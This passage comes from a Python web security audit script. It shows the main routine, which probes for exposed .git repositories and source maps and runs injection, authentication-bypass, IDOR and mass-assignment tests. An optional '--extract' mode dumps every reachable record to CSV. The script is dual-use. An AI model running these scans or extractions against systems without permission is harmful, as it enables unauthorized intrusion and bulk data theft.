    robot_paths, robot_api_routes = parse_robots_and_sitemap(session, target, path_findings)
    api_routes = list(set(api_routes + robot_api_routes))
    # Probe newly discovered paths from robots/sitemap
    if robot_paths:
        for rp in robot_paths[:30]:
            result = probe_path(session, target, rp, baseline_hash)
            if result:
                path_findings.append(result)
                log.finding("INFO", f"robots/sitemap: {result['status']} {result['path']}")

    # Source map discovery
    sourcemap_findings = discover_source_maps(session, target, js_urls)
    all_findings.extend(sourcemap_findings)

    # Git repository exposure
    git_findings = probe_git_exposure(session, target, path_findings)
    all_findings.extend(git_findings)

    # Add tech from headers
    for k, v in resp_headers.items():
        if k.lower() == "x-powered-by":
            tech_info["backend"] = v
        if k.lower() == "server":
            tech_info["server"] = v

    # ── Phase 3A: Injection Testing ──────────────────────────────────────
    if not skip_injection:
        injection_findings = run_injection_tests(
            session, target, api_routes, path_findings, baseline_hash)
        all_findings.extend(injection_findings)

    # ── Phase 3B: API Security Testing ───────────────────────────────────
    log.banner("Phase 3B: API Security Testing")
    api_findings, accessible_eps, writable_eps, data_eps = test_api_endpoints(
        session, target, api_routes, baseline_hash)
    all_findings.extend(api_findings)

    auth_findings = test_auth_bypass(session, target, api_routes)
    all_findings.extend(auth_findings)

    upload_findings = check_upload_endpoints(session, target, api_routes)
    all_findings.extend(upload_findings)

    # GraphQL introspection
    graphql_findings = test_graphql_introspection(session, target, path_findings)
    all_findings.extend(graphql_findings)

    # JWT analysis
    jwt_findings = analyze_jwt_tokens(session, target, api_routes, resp_headers)
    all_findings.extend(jwt_findings)

    # HTTP method testing
    method_findings = test_http_methods(session, target, api_routes, path_findings)
    all_findings.extend(method_findings)

    # IDOR testing
    idor_findings = test_idor(session, target, data_eps, baseline_hash)
    all_findings.extend(idor_findings)

    # Mass assignment testing
    mass_findings = test_mass_assignment(session, target, api_routes, writable_eps, baseline_hash)
    all_findings.extend(mass_findings)

    # ── Phase 3C: Subdomain Enumeration ──────────────────────────────────
    if not skip_subdomains:
        subdomain_findings = enumerate_subdomains(session, target)
        all_findings.extend(subdomain_findings)

    # ── Phase 4: Additional Checks ───────────────────────────────────────
    log.banner("Phase 4: Additional Checks")
    rate_findings = check_rate_limiting(session, target)
    all_findings.extend(rate_findings)

    info_findings = check_info_disclosure(session, target, api_routes, resp_headers)
    all_findings.extend(info_findings)

    # ── Phase 5: Data Extraction ─────────────────────────────────────────
    extraction_stats = []
    if extract:
        log.banner("Phase 5: Data Extraction")
        extract_dir = os.path.join(output_dir, "extracted_data")
        extraction_stats = extract_data(session, target, data_eps, extract_dir)

    # Phase 6: Report
    log.banner("Phase 6: Report Generation")

    # Sort findings by severity
    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    all_findings.sort(key=lambda f: severity_order.get(f["severity"], 99))

    # Deduplicate findings by title
    seen = set()
    unique_findings = []
    for f in all_findings:
        if f["title"] not in seen:
            seen.add(f["title"])
            unique_findings.append(f)
    all_findings = unique_findings

    report_path = os.path.join(output_dir, f"security_report_{domain}.pdf")
    generate_report(target, all_findings, tech_info, accessible_eps,
                    writable_eps, extraction_stats, report_path)

    # Save raw findings as JSON too
    json_path = os.path.join(output_dir, f"findings_{domain}.json")
    with open(json_path, "w") as f:
        # Remove non-serializable data
        serializable = []
        for finding in all_findings:
            sf = {k: v for k, v in finding.items()
                  if k not in ("endpoints", "writable")}
            serializable.append(sf)
        json.dump({
            "target": target,
            "date": datetime.now().isoformat(),
            "finding_count": len(all_findings),
            "findings": serializable,
            "tech_info": tech_info,
            "accessible_endpoints": accessible_eps,
            "writable_endpoints": writable_eps,
        }, f, indent=2, default=str)
    log.info(f"Raw findings JSON: {json_path}")

    # Summary
    log.banner("Audit Complete")
    counts = {}
    for f in all_findings:
        s = f["severity"]
        counts[s] = counts.get(s, 0) + 1

    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        if counts.get(sev, 0) > 0:
            log.finding(sev, f"{counts[sev]} findings")

    log.info(f"API endpoints tested: {len(api_routes)}")
    log.info(f"Accessible without auth: {len(accessible_eps)}")
    log.info(f"Writable without auth: {len(writable_eps)}")
    if extraction_stats:
        total_extracted = sum(e["records"] for e in extraction_stats)
        log.info(f"Records extracted: {total_extracted}")
    log.info(f"Report: {report_path}")
    log.info(f"Output: {output_dir}")

    return all_findings


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Web Application Security Audit Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 audit.py https://example.com                           # Scan only
  python3 audit.py https://example.com --extract                 # Scan + extract data
  python3 audit.py https://example.com -o /tmp/report            # Custom output dir
  python3 audit.py https://example.com --bearer-token <TOKEN>    # Authenticated scan
  python3 audit.py https://example.com --cookie "session=abc"    # Cookie-based auth
  python3 audit.py https://example.com --api-key KEY --api-key-header X-Auth-Token
        """,
    )
    parser.add_argument("target", help="Target URL (e.g., https://example.com)")
    parser.add_argument("--extract", "-e", action="store_true",
                        help="Extract all accessible data to CSV (breach scope assessment)")
    parser.add_argument("--output", "-o", default=None,
                        help="Output directory (default: ~/Desktop/audit_<domain>_<timestamp>)")
    parser.add_argument("--timeout", "-t", type=int, default=15,
                        help="Request timeout in seconds (default: 15)")
    parser.add_argument("--delay", "-d", type=float, default=0.3,
                        help="Delay between requests in seconds (default: 0.3)")
    # Auth flags
    parser.add_argument("--bearer-token", default=None,
                        help="Bearer token for Authorization header (e.g. a JWT)")
    parser.add_argument("--cookie", default=None,
                        help="Cookie header value for authenticated requests")
    parser.add_argument("--api-key", default=None,
                        help="API key value to include in requests")
    parser.add_argument("--api-key-header", default="X-API-Key",
                        help="Header name for the API key (default: X-API-Key)")
    # Skip flags
    parser.add_argument("--skip-injection", action="store_true",
                        help="Skip injection testing (SQLi, XSS, CMDI, LFI, SSTI, SSRF, CRLF, etc.)")
    parser.add_argument("--skip-subdomains", action="store_true",
                        help="Skip subdomain enumeration")
    parser.add_argument("--skip-dns", action="store_true",
                        help="Skip DNS security checks (SPF, DMARC, zone transfer)")

    args = parser.parse_args()

    global REQUEST_TIMEOUT, RATE_LIMIT_DELAY
    REQUEST_TIMEOUT = args.timeout
    RATE_LIMIT_DELAY = args.delay

    auth = {}
    if args.bearer_token:
        auth["bearer_token"] = args.bearer_token
    if args.cookie:
        auth["cookie"] = args.cookie
    if args.api_key:
        auth["api_key"] = args.api_key
        auth["api_key_header"] = args.api_key_header

    try:
        run_audit(
            args.target,
            extract=args.extract,
            output_dir=args.output,
            auth=auth if auth else None,
            skip_injection=args.skip_injection,
            skip_subdomains=args.skip_subdomains,
            skip_dns=args.skip_dns,
        )
    except KeyboardInterrupt:
        print("\n\nAudit interrupted by user.")
        sys.exit(1)


if __name__ == "__main__":
    main()
